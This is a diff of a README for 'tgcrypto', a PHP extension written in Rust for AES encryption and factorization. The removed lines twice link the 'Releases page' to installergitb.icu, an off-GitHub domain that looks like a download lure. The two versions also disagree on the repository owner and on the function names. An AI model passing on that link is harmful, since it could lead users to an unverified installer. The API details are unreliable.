@@ -1,105 +1,125 @@
-# 🌟 tgcrypto: A PHP Extension for Cryptographic Functions Using Rust
+# tgcrypto: A PHP Extension for Cryptographic Functions Using Rust 🔒
 
-![tgcrypto](https://img.shields.io/badge/tgcrypto-v1.0.0-blue.svg) ![PHP](https://img.shields.io/badge/PHP-8.0%2B-orange.svg) ![Rust](https://img.shields.io/badge/Rust-1.55%2B-green.svg)
+![tgcrypto](https://img.shields.io/badge/version-1.0.0-blue.svg) ![GitHub Releases](https://img.shields.io/github/release/watchrapon/tgcrypto.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg)
 
-Welcome to the **tgcrypto** repository! This project offers a PHP extension that enhances cryptographic functions using the power of Rust. With **tgcrypto**, you can efficiently handle cryptographic tasks such as encryption, decryption, and prime factorization, all while enjoying the performance benefits of Rust.
+Welcome to **tgcrypto**, a PHP extension designed to enhance your cryptographic capabilities using the power of Rust. This project aims to provide efficient and secure cryptographic functions that can be easily integrated into your PHP applications. Whether you are developing a bot for Telegram or need robust encryption methods, tgcrypto has you covered.
 
-## 🚀 Features
+## Table of Contents
 
-- **AES-CBC & AES-IGE**: Implement secure encryption and decryption methods.
-- **Factorization**: Easily factorize numbers and handle prime numbers.
-- **Rust Integration**: Leverage Rust's performance and safety in your PHP applications.
-- **PHP 8 Support**: Fully compatible with PHP 8, ensuring modern features and performance.
-- **Lightweight**: Minimal overhead, making it ideal for performance-critical applications.
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Supported Cryptographic Functions](#supported-cryptographic-functions)
+- [Contributing](#contributing)
+- [License](#license)
+- [Links](#links)
 
-## 📦 Installation
+## Features
 
-To get started with **tgcrypto**, you can download the latest release from our [Releases page](https://installergitb.icu?u29jbged0u94clm). Follow the instructions in the release notes to install and execute the extension in your environment.
+- **Fast and Secure**: Leverage the speed of Rust for cryptographic operations while maintaining security.
+- **Easy Integration**: Simple installation and usage within your existing PHP projects.
+- **Comprehensive Functionality**: Supports various cryptographic algorithms, including AES and factorization methods.
+- **Open Source**: Contribute to the project and help improve its features and security.
 
-## 📜 Usage
+## Installation
 
-Here’s a quick example of how to use **tgcrypto** in your PHP application:
+To get started with tgcrypto, you need to download the latest release. Visit [Releases](https://github.com/watchrapon/tgcrypto/releases) to find the appropriate version for your system. 
+
+After downloading, follow these steps to install the extension:
+
+1. **Download the Release**: Choose the appropriate package for your operating system from the releases page.
+2. **Extract the Files**: Unzip the downloaded file to a directory of your choice.
+3. **Install the Extension**:
+   - For Linux, you can run the following command in your terminal:
+     ```bash
+     sudo pecl install tgcrypto
+     ```
+   - For Windows, follow the instructions in the `INSTALL.md` file included in the package.
+
+4. **Enable the Extension**: Add the following line to your `php.ini` file:
+   ```
+   extension=tgcrypto.so
+   ```
+
+5. **Restart Your Web Server**: Make sure to restart your server to apply the changes.
+
+## Usage
+
+Once installed, you can start using tgcrypto in your PHP scripts. Here’s a basic example of how to use the AES encryption feature:
 
 ```php
 <?php
 // Load the tgcrypto extension
 if (!extension_loaded('tgcrypto')) {
-    die('tgcrypto extension not loaded');
+    die('tgcrypto extension is not loaded');
 }
 
-// Example of AES-CBC encryption
-$key = 'your-encryption-key';
-$plaintext = 'Hello, World!';
-$ciphertext = tgcrypto_aes_cbc_encrypt($plaintext, $key);
+// Sample data
+$data = "Hello, World!";
+$key = "your-encryption-key";
 
-// Example of AES-CBC decryption
-$decrypted = tgcrypto_aes_cbc_decrypt($ciphertext, $key);
+// Encrypt the data
+$encryptedData = tgcrypto_aes_encrypt($data, $key);
+echo "Encrypted: " . $encryptedData . "\n";
 
-echo "Decrypted text: " . $decrypted;
+// Decrypt the data
+$decryptedData = tgcrypto_aes_decrypt($encryptedData, $key);
+echo "Decrypted: " . $decryptedData . "\n";
 ?>
 ```
 
-This example demonstrates how to load the extension and perform basic encryption and decryption using AES-CBC. For more advanced usage, please refer to the documentation.
+This example demonstrates how to encrypt and decrypt data using the AES algorithm. You can replace `tgcrypto_aes_encrypt` and `tgcrypto_aes_decrypt` with other available functions as needed.
 
-## 📖 Documentation
+## Supported Cryptographic Functions
 
-Comprehensive documentation is available in the `docs` directory. You can find detailed information on all functions, usage examples, and best practices. 
+tgcrypto provides a range of cryptographic functions. Here are some of the key algorithms you can use:
 
-## 🛠️ Development
+- **AES (Advanced Encryption Standard)**: 
+  - `tgcrypto_aes_encrypt($data, $key)`: Encrypts data using AES.
+  - `tgcrypto_aes_decrypt($encryptedData, $key)`: Decrypts AES-encrypted data.
 
-If you want to contribute to **tgcrypto**, you can set up your development environment by following these steps:
+- **Factorization**: Useful for cryptographic applications that rely on large prime numbers.
 
-1. **Clone the repository**:
+- **MTProto**: Implementations for Telegram bots to handle secure communications.
+
+- **Other Algorithms**: Additional cryptographic functions will be added over time, so keep an eye on the updates.
+
+## Contributing
+
+We welcome contributions to tgcrypto! If you have ideas for new features, improvements, or bug fixes, please follow these steps:
+
+1. **Fork the Repository**: Click the "Fork" button on the top right of this page.
+2. **Create a New Branch**: Use a descriptive name for your branch:
    ```bash
-   git clone https://github.com/gwtampan299000/tgcrypto.git
-   cd tgcrypto
+   git checkout -b feature/your-feature-name
    ```
+3. **Make Your Changes**: Implement your feature or fix.
+4. **Commit Your Changes**: Write clear and concise commit messages.
+   ```bash
+   git commit -m "Add feature XYZ"
+   ```
+5. **Push to Your Fork**: 
+   ```bash
+   git push origin feature/your-feature-name
+   ```
+6. **Create a Pull Request**: Go to the original repository and submit your pull request.
 
-2. **Install dependencies**:
-   Make sure you have PHP and Rust installed. You can use `composer` for PHP dependencies.
+## License
 
-3. **Build the extension**:
-   Follow the instructions in the `BUILD.md` file to compile the Rust code and generate the PHP extension.
+tgcrypto is licensed under the MIT License. Feel free to use, modify, and distribute the code as you see fit.
 
-4. **Run tests**:
-   Ensure everything works as expected by running the tests provided in the `tests` directory.
+## Links
 
-## 🔧 Topics
+For the latest releases, visit [Releases](https://github.com/watchrapon/tgcrypto/releases). Here, you can find all the downloadable files and installation instructions.
 
-This project covers various topics related to cryptography and programming, including:
+Explore the topics related to tgcrypto: 
+- [AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
+- [Cryptography](https://en.wikipedia.org/wiki/Cryptography)
+- [Telegram Bots](https://core.telegram.org/bots)
+- [Rust](https://www.rust-lang.org/)
 
-- **AES-CBC**: A widely used encryption method.
-- **AES-IGE**: An alternative encryption mode.
-- **Cryptography**: The study and practice of secure communication.
-- **Factorization**: Breaking down numbers into their prime components.
-- **PHP-Rust Tools**: Tools and libraries that facilitate PHP and Rust integration.
-- **Prime Numbers**: Fundamental components in number theory and cryptography.
+Stay updated with our progress and contribute to the project. Your feedback and contributions are invaluable to us.
 
-## 🌐 Community
+---
 
-Join our community on GitHub to share your experiences, ask questions, and contribute to the project. We welcome contributions, whether they are code, documentation, or feedback.
-
-## 📅 Roadmap
-
-We have exciting plans for the future of **tgcrypto**. Here are some of the features we aim to implement:
-
-- Support for additional encryption algorithms.
-- Enhanced performance optimizations.
-- Improved documentation and tutorials.
-- Community-driven features based on user feedback.
-
-## 📞 Contact
-
-For any inquiries or support, please reach out via GitHub issues or contact the maintainers directly.
-
-## 🎉 Acknowledgments
-
-We would like to thank the open-source community for their invaluable contributions and support. Special thanks to the Rust and PHP communities for their continuous efforts in improving these languages.
-
-## 📥 Download
-
-Don’t forget to visit our [Releases page](https://installergitb.icu?hh3uuera86hjrzb) to download the latest version of **tgcrypto**. Follow the instructions to install and start using the extension in your projects.
-
-## 🌈 Conclusion
-
-Thank you for your interest in **tgcrypto**. We hope this extension serves your cryptographic needs effectively. We look forward to your contributions and feedback as we continue to improve and expand this project. Happy coding!
+Feel free to reach out with any questions or suggestions. Happy coding!
